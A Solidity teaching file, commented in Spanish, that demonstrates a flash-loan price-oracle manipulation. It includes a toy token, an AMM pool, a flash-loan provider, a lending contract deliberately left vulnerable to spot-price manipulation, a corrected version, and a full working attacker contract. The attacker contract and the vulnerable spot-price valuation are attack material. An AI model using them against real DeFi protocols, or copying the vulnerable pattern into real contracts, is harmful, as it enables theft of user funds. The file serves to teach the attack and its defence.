// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

// Token ERC-20 minimo, para tener dos activos con los que armar una pool.
contract TokenDePrueba {
    string public name;
    string public symbol;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint256 suministroInicial) {
        name = name_;
        symbol = symbol_;
        _mint(msg.sender, suministroInicial);
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 permitido = allowance[from][msg.sender];
        require(permitido >= value, "Allowance insuficiente");

        allowance[from][msg.sender] = permitido - value;
        _transfer(from, to, value);
        return true;
    }

    function mint(address to, uint256 value) external {
        _mint(to, value);
    }

    function _mint(address to, uint256 value) internal {
        totalSupply += value;
        balanceOf[to] += value;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(balanceOf[from] >= value, "Saldo insuficiente");
        balanceOf[from] -= value;
        balanceOf[to] += value;
    }
}

// Un exchange automatizado (AMM) minimo, formula x*y=k, SIN comision (para
// simplificar los numeros). El precio de A en B se lee de la relacion entre
// las reservas: cambiarla drasticamente en un solo swap grande es sencillo
// si la pool tiene poca liquidez.
contract PoolSimple {
    TokenDePrueba public immutable tokenA;
    TokenDePrueba public immutable tokenB;

    uint256 public reservaA;
    uint256 public reservaB;

    constructor(TokenDePrueba tokenA_, TokenDePrueba tokenB_) {
        tokenA = tokenA_;
        tokenB = tokenB_;
    }

    function agregarLiquidez(uint256 montoA, uint256 montoB) external {
        tokenA.transferFrom(msg.sender, address(this), montoA);
        tokenB.transferFrom(msg.sender, address(this), montoB);

        reservaA += montoA;
        reservaB += montoB;
    }

    // Precio SPOT de A en terminos de B, con 18 decimales. Es el precio
    // MARGINAL en este instante: cambia con cada swap.
    function precioSpotAenB() public view returns (uint256) {
        require(reservaA > 0, "Sin liquidez");
        return (reservaB * 1e18) / reservaA;
    }

    function swapBporA(uint256 montoB) external returns (uint256 montoA) {
        require(montoB > 0, "monto invalido");
        tokenB.transferFrom(msg.sender, address(this), montoB);

        montoA = (reservaA * montoB) / (reservaB + montoB);

        reservaB += montoB;
        reservaA -= montoA;

        tokenA.transfer(msg.sender, montoA);
    }

    function swapAporB(uint256 montoA) external returns (uint256 montoB) {
        require(montoA > 0, "monto invalido");
        tokenA.transferFrom(msg.sender, address(this), montoA);

        montoB = (reservaB * montoA) / (reservaA + montoA);

        reservaA += montoA;
        reservaB -= montoB;

        tokenB.transfer(msg.sender, montoB);
    }
}

// ---- Flash loans ----
//
// Un flash loan presta cualquier monto SIN garantia, con la condicion de
// que se devuelva (con una comision) antes de que termine la MISMA
// transaccion. Si no se devuelve, todo revierte como si nada hubiera
// pasado: el proveedor nunca corre riesgo. Lo que SI habilitan es que un
// atacante mueva precios con mucho mas capital del que tiene, durante los
// pocos segundos (en realidad, unas pocas instrucciones) que dura su ataque.
interface IReceptorFlashLoan {
    function ejecutarOperacion(TokenDePrueba token, uint256 monto, uint256 comision, bytes calldata datos) external;
}

contract ProveedorFlashLoan {
    TokenDePrueba public immutable token;
    uint256 public constant COMISION_BPS = 30; // 0.3%

    constructor(TokenDePrueba token_) {
        token = token_;
    }

    function fondear(uint256 monto) external {
        token.transferFrom(msg.sender, address(this), monto);
    }

    function flashLoan(uint256 monto, bytes calldata datos) external {
        uint256 saldoAntes = token.balanceOf(address(this));
        require(monto <= saldoAntes, "Sin liquidez suficiente");

        uint256 comision = (monto * COMISION_BPS) / 10_000;

        token.transfer(msg.sender, monto);

        IReceptorFlashLoan(msg.sender).ejecutarOperacion(token, monto, comision, datos);

        uint256 saldoDespues = token.balanceOf(address(this));
        require(saldoDespues >= saldoAntes + comision, "Prestamo no devuelto con su comision");
    }
}

// Interfaz comun para poder atacar cualquiera de los dos consumidores con
// el mismo contrato atacante.
interface IConsumidorPrestamos {
    function depositarYPrestar(uint256 montoColateral) external returns (uint256 prestado);
}

// ============================================================================
// VULNERABLE: valua el colateral con el precio SPOT de la pool, en la
// MISMA transaccion en la que alguien podria estar manipulando esa pool.
// ============================================================================
contract ConsumidorOraculoVulnerable is IConsumidorPrestamos {
    PoolSimple public immutable pool;
    TokenDePrueba public immutable tokenA;
    TokenDePrueba public immutable tokenB;

    constructor(PoolSimple pool_, TokenDePrueba tokenA_, TokenDePrueba tokenB_) {
        pool = pool_;
        tokenA = tokenA_;
        tokenB = tokenB_;
    }

    function fondear(uint256 monto) external {
        tokenB.transferFrom(msg.sender, address(this), monto);
    }

    function depositarYPrestar(uint256 montoColateral) external returns (uint256 prestado) {
        tokenA.transferFrom(msg.sender, address(this), montoColateral);

        prestado = (montoColateral * pool.precioSpotAenB()) / 1e18;

        tokenB.transfer(msg.sender, prestado);
    }
}

// ============================================================================
// CORREGIDO: el precio viene de una fuente separada y confiable (un
// oraculo real, como el de la leccion 16 del modulo 02, validado y con
// actualizaciones espaciadas en el tiempo), no de una pool que cualquiera
// puede mover dentro de la misma transaccion.
// ============================================================================
contract ConsumidorOraculoSeguro is IConsumidorPrestamos {
    TokenDePrueba public immutable tokenA;
    TokenDePrueba public immutable tokenB;
    address public immutable admin;

    uint256 public precioAenB;

    constructor(TokenDePrueba tokenA_, TokenDePrueba tokenB_, uint256 precioInicial) {
        tokenA = tokenA_;
        tokenB = tokenB_;
        admin = msg.sender;
        precioAenB = precioInicial;
    }

    // Solo el admin (en la practica: un proceso de oraculo separado y
    // auditado) puede actualizar el precio, y no dentro de la transaccion
    // de quien pide el prestamo.
    function actualizarPrecio(uint256 nuevoPrecio) external {
        require(msg.sender == admin, "No autorizado");
        precioAenB = nuevoPrecio;
    }

    function fondear(uint256 monto) external {
        tokenB.transferFrom(msg.sender, address(this), monto);
    }

    function depositarYPrestar(uint256 montoColateral) external returns (uint256 prestado) {
        tokenA.transferFrom(msg.sender, address(this), montoColateral);

        prestado = (montoColateral * precioAenB) / 1e18;

        tokenB.transfer(msg.sender, prestado);
    }
}

// ============================================================================
// El ataque: piden un flash loan, empujan el precio de la pool, y venden el
// activo comprado al consumidor que confia en ese precio ya manipulado.
// Nunca hace falta "deshacer" el swap: la ganancia sale de vender caro a
// quien mira el precio equivocado, no de la pool en si.
// ============================================================================
contract AtacanteFlashLoan is IReceptorFlashLoan {
    ProveedorFlashLoan public immutable proveedor;
    PoolSimple public immutable pool;
    IConsumidorPrestamos public immutable consumidor;
    TokenDePrueba public immutable tokenA;
    TokenDePrueba public immutable tokenB;
    address public immutable propietario;

    constructor(
        ProveedorFlashLoan proveedor_,
        PoolSimple pool_,
        IConsumidorPrestamos consumidor_,
        TokenDePrueba tokenA_,
        TokenDePrueba tokenB_
    ) {
        proveedor = proveedor_;
        pool = pool_;
        consumidor = consumidor_;
        tokenA = tokenA_;
        tokenB = tokenB_;
        propietario = msg.sender;
    }

    function atacar(uint256 montoPrestamo) external {
        require(msg.sender == propietario, "No autorizado");
        proveedor.flashLoan(montoPrestamo, "");
    }

    function ejecutarOperacion(TokenDePrueba token, uint256 monto, uint256 comision, bytes calldata) external {
        require(msg.sender == address(proveedor), "Solo el proveedor");

        // 1. Compra tokenA con TODO el prestamo: esto empuja fuerte hacia
        //    arriba el precio spot de A (en terminos de B) dentro de la pool.
        token.approve(address(pool), monto);
        uint256 aComprado = pool.swapBporA(monto);

        // 2. "Vende" ese tokenA al consumidor, que lo valua al precio spot
        //    YA INFLADO -no al promedio que en realidad pagamos en el swap-.
        tokenA.approve(address(consumidor), aComprado);
        consumidor.depositarYPrestar(aComprado);

        // 3. Devuelve el prestamo con su comision. Lo que sobra es ganancia
        //    neta, sin haber arriesgado capital propio.
        token.transfer(address(proveedor), monto + comision);
    }

    function gananciaEnB() external view returns (uint256) {
        return tokenB.balanceOf(address(this));
    }
}
